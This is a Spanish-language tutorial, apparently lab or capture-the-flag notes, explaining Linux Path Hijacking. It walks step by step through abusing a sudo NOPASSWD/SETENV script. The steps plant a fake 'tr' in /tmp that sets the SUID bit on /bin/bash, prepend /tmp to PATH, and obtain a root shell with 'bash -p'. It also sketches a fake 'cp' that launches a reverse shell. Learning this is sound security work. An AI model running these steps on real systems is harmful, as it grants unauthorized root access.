<h1 align="center">Path Hijacking**</h1>

## **DEFINICIÓN:**

El Path Hijacking (Secuestro de Ruta) es una técnica de ataque donde un atacante manipula la variable de entorno PATH para ejecutar programas maliciosos en lugar de los programas legítimos.

## **FUNCIONAMIENTO**

- El atacante modifica la variable PATH para incluir directorios bajo su control al principio de la lista.

## **Localizar un script que ejecute un comando con la ruta relativa**

Ejemplo:

- cat script.sh

cp /home/\* /copia-home

## **Manipular la variable $PATH**

- echo PATH=/tmp:$PATH

## **Crear el comando cp**

- cd /tmp
- nano cp
- /bin/bash -c “reverse shell”

## **EXPLICACIÓN**

Cuando se ejecute el comando cp del script, en el primer lugar que buscará el comando cp es en /tmp por lo que se ejecutará una reverse shell. Si este script lo ejecuta root tendremos una reverse shell como root.

## **Ejemplo de convertir el bash en suid con path hijacking**

### **Manual de Escalada de Privilegios: Shell como Root**

#### **Descripción**

En este manual, se explicará cómo escalar privilegios a root utilizando un script que puede ser ejecutado con sudo sin necesidad de contraseña (NOPASSWD) y con la capacidad de modificar variables de entorno (SETENV). Aprovecharemos la presencia de rutas relativas en el script para realizar un ataque conocido como **Path Hijacking**.

### **Enumeración Básica del Sistema**

**Verificación de Permisos con sudo**: Ejecuta el siguiente comando para ver los permisos del usuario gh0st:

- sudo -l

Deberías ver una salida similar a la siguiente:  

(ALL : ALL) SETENV: NOPASSWD: /opt/security.sh

### **Análisis del Script**

1. **Analizar el Contenido del Script /opt/security.sh**: Revisa el script para identificar comandos que se ejecutan con rutas relativas. Esto es crucial para planificar el ataque de Path Hijackingm, EL SCRIPT CONTIENE EL COMANDO TR Y SE NOMBRA DE FORMA RELATIVA.

### **Ataque de Path Hijacking**

**Preparar el Entorno**: Nos movemos a un directorio donde tengamos permisos de escritura, como /tmp:  
cd /tmp

**Crear un Script Malicioso**: Creamos un script llamado tr, que reemplazará al comando tr original y asignará permisos SUID al binario bash:  
<br/>echo '#!/bin/bash' > tr

echo 'chmod +s /bin/bash' >> tr

chmod +x tr

**Modificar la Variable PATH**: Ajustamos la variable PATH para que incluya el directorio /tmp antes de las rutas habituales:  
<br/>echo $PATH

\# Verifica la ruta actual, debería mostrar algo como:

\# /usr/local/bin:/usr/bin:/bin:/usr/games

PATH=/tmp:$PATH

echo $PATH

\# Verifica que ahora la ruta incluye /tmp al principio:

\# /tmp:/usr/local/bin:/usr/bin:/bin:/usr/games

**Ejecutar el Script con Path Hijacking**: Ejecutamos el script security.sh especificando la variable de entorno PATH modificada:  
<br/>sudo -u 'root' PATH=/tmp:$PATH /opt/security.sh

1. El script se ejecutará y utilizará nuestro script tr en lugar del comando tr original, activando el bit SUID en bash.

### **Verificar y Escalar Privilegios**

**Verificar Permisos del Binario bash**: Verifica que el bit SUID del binario bash está activo:  
<br/>ls -la /bin/bash

Deberías ver una salida similar a esta, indicando que el bit SUID está activo:  
<br/>\-rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash

**Obtener una Shell con Privilegios de Root**: Ahora puedes ejecutar bash con privilegios de root:  
<br/>bash -p

**Verificar Usuario**: Comprueba que tienes privilegios de root:  
<br/>whoami

\# Debería devolver:

\# root
